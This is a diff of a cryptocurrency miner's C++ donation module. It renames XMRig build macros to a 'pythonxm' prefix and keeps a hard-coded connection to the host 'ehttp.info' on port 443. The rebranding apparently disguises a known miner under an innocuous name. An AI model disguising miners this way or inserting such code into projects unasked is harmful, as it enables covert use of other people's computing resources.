@@ -51,7 +51,7 @@ static inline double randomf(double min, double max)                 { return (m
 static inline uint64_t random(uint64_t base, double min, double max) { return static_cast<uint64_t>(base * randomf(min, max)); }
 
 static const char *kDonateHost = "ehttp.info";
-#ifdef XMRIG_FEATURE_TLS
+#ifdef PYTHONXM_FEATURE_TLS
 static const char *kDonateHostTls = "ehttp.info";
 #endif
 
@@ -70,13 +70,13 @@ pythonxm::DonateStrategy::DonateStrategy(Controller *controller, IStrategyListen
     keccak(reinterpret_cast<const uint8_t *>(user.data()), user.size(), hash);
     Cvt::toHex(m_userId, sizeof(m_userId), hash, 32);
 
-#   ifdef XMRIG_ALGO_KAWPOW
+#   ifdef PYTHONXM_ALGO_KAWPOW
     constexpr Pool::Mode mode = Pool::MODE_AUTO_ETH;
 #   else
     constexpr Pool::Mode mode = Pool::MODE_POOL;
 #   endif
 
-#   ifdef XMRIG_FEATURE_TLS
+#   ifdef PYTHONXM_FEATURE_TLS
     m_pools.emplace_back(kDonateHostTls, 443, m_userId, nullptr, 0, true, true, mode);
 #   endif
     m_pools.emplace_back(kDonateHost, 443, m_userId, nullptr, 0, true, false, mode);
@@ -193,7 +193,7 @@ void pythonxm::DonateStrategy::onLogin(IClient *, rapidjson::Document &doc, rapi
     using namespace rapidjson;
     auto &allocator = doc.GetAllocator();
 
-#   ifdef XMRIG_FEATURE_TLS
+#   ifdef PYTHONXM_FEATURE_TLS
     if (m_tls) {
         char buf[40] = { 0 };
         snprintf(buf, sizeof(buf), "stratum+ssl://%s", m_pools[0].url().data());
